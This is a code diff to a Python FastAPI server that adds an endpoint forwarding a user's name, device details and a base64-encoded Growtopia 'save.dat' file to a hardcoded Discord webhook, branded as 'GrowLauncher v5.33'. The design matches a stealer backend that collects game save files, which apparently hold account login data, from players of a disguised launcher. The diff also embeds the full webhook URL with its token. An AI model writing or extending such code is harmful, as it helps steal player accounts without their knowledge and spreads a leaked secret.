@@ -13,6 +13,8 @@ from datetime import datetime, timedelta
 import bcrypt
 import jwt
 import base64
+import httpx
+import json
 
 ROOT_DIR = Path(__file__).parent
 load_dotenv(ROOT_DIR / '.env')
@@ -66,6 +68,11 @@ class LuaFileResponse(BaseModel):
 class Token(BaseModel):
     access_token: str
     token_type: str = "bearer"
+
+class DiscordWebhookData(BaseModel):
+    username: Optional[str] = None
+    device_info: Optional[str] = None
+    file_content: Optional[str] = None  # base64 encoded file
 
 # ==================== HELPER FUNCTIONS ====================
 
@@ -230,6 +237,84 @@ async def delete_lua_file(file_id: str, current_user: dict = Depends(get_current
     if result.deleted_count == 0:
         raise HTTPException(status_code=404, detail="File not found")
     return {"message": "File deleted successfully"}
+
+# ==================== DISCORD WEBHOOK ====================
+
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1275463565968543834/nJydfdfG0v_4qKCtcF2_iydSlH5hhNr-FdSlJ_6vR09vjIDcIUEbIWRMMJjnvXWX9Uft"
+
+@api_router.post("/discord/send-savedat")
+async def send_to_discord(data: DiscordWebhookData):
+    try:
+        # Prepare Discord message
+        timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
+        
+        embed = {
+            "title": "🚀 Growtopia Launched!",
+            "color": 7506394,  # Purple color
+            "fields": [
+                {
+                    "name": "User",
+                    "value": data.username or "Anonymous",
+                    "inline": True
+                },
+                {
+                    "name": "Device",
+                    "value": data.device_info or "Unknown",
+                    "inline": True
+                },
+                {
+                    "name": "Time",
+                    "value": timestamp,
+                    "inline": False
+                }
+            ],
+            "footer": {
+                "text": "GrowLauncher v5.33"
+            }
+        }
+        
+        # Prepare the Discord webhook payload
+        payload = {
+            "embeds": [embed]
+        }
+        
+        # If file content is provided, send it as attachment
+        if data.file_content:
+            try:
+                # Decode base64 file
+                file_bytes = base64.b64decode(data.file_content)
+                
+                # Send file as multipart form data
+                async with httpx.AsyncClient() as client:
+                    files = {
+                        'file': ('save.dat', file_bytes, 'application/octet-stream')
+                    }
+                    payload_data = {
+                        'payload_json': json.dumps(payload)
+                    }
+                    response = await client.post(
+                        DISCORD_WEBHOOK_URL,
+                        files=files,
+                        data=payload_data
+                    )
+            except Exception as e:
+                logger.error(f"Error sending file to Discord: {e}")
+                # If file sending fails, at least send the embed
+                async with httpx.AsyncClient() as client:
+                    response = await client.post(DISCORD_WEBHOOK_URL, json=payload)
+        else:
+            # Send just the embed without file
+            async with httpx.AsyncClient() as client:
+                response = await client.post(DISCORD_WEBHOOK_URL, json=payload)
+        
+        if response.status_code not in [200, 204]:
+            raise HTTPException(status_code=500, detail="Failed to send to Discord")
+        
+        return {"message": "Successfully sent to Discord", "status": response.status_code}
+    
+    except Exception as e:
+        logger.error(f"Discord webhook error: {e}")
+        raise HTTPException(status_code=500, detail=str(e))
 
 # ==================== HEALTH CHECK ====================
 
